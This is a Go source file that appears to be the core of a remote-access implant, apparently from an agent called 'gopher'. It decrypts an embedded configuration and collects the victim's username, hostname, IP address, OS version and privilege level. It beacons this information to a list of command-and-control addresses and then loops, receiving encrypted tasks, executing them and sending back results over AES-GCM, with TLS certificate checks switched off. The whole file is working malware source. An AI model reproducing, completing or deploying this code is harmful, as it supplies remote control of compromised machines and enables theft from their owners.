package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/vmihailenco/msgpack/v5"
	"gopher/functions"
	"io"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

var (
	ACTIVE = true
)

func EncryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profile Profile
var AgentId uint32
var encKey []byte
var sKey []byte

func main() {

	encKey = encProfile[:16]
	encProfile = encProfile[16:]
	encProfile, _ = DecryptData(encProfile, encKey)

	err := msgpack.Unmarshal(encProfile, &profile)
	if err != nil {
		return
	}

	sessionInfo, sessionKey := CreateInfo()
	sKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	initData, _ := msgpack.Marshal(InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(StartMsg{Type: INIT_PACK, Data: initData})
	initMsg, _ = EncryptData(initMsg, encKey)

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]Connection)
	JOBS = make(map[string]Connection)

	addrIndex := 0
	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(profile.Addresses)
		}

		///// Connect

		var (
			err  error
			conn net.Conn
		)

		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
		if err != nil {
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := connRead(conn, profile.BannerSize)
			if err != nil {
				continue
			}
		}

		/// Send Init
		sendMsg(conn, initMsg)

		/// Recv Command

		var (
			inMessage  Message
			outMessage Message
			recvData   []byte
			sendData   []byte
		)

		for ACTIVE {
			recvData, err = recvMsg(conn)
			if err != nil {
				break
			}

			outMessage = Message{Type: 0}
			recvData, err = DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ = msgpack.Marshal(outMessage)
			sendData, _ = EncryptData(sendData, sessionKey)
			sendMsg(conn, sendData)
		}
	}
}

func connRead(conn net.Conn, size int) ([]byte, error) {
	if size <= 0 {
		return nil, fmt.Errorf("incorrected size: %d", size)
	}

	message := make([]byte, 0, size)
	tmpBuff := make([]byte, 1024)
	readSize := 0

	for readSize < size {
		toRead := size - readSize
		if toRead < len(tmpBuff) {
			tmpBuff = tmpBuff[:toRead]
		}

		n, err := conn.Read(tmpBuff)
		if err != nil {
			return nil, err
		}

		message = append(message, tmpBuff[:n]...)
		readSize += n
	}
	return message, nil
}

func recvMsg(conn net.Conn) ([]byte, error) {
	bufLen, err := connRead(conn, 4)
	if err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(bufLen)

	return connRead(conn, int(msgLen))
}

func sendMsg(conn net.Conn, data []byte) {
	if conn == nil {
		return
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, _ = conn.Write(message)
}
